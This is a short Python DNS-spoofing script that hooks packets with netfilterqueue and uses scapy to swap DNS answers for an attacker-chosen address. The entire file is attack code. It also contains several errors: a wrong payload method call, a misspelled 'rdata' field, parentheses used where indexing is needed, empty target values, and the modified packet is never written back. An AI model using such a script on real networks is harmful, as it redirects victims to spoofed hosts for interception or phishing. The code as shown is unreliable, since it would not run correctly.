import netfilterqueue
import scapy.all as scapy


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get.payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet(scapy.DNSQR).qname
        if "" in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdate="")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

    packet.accept() 

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()


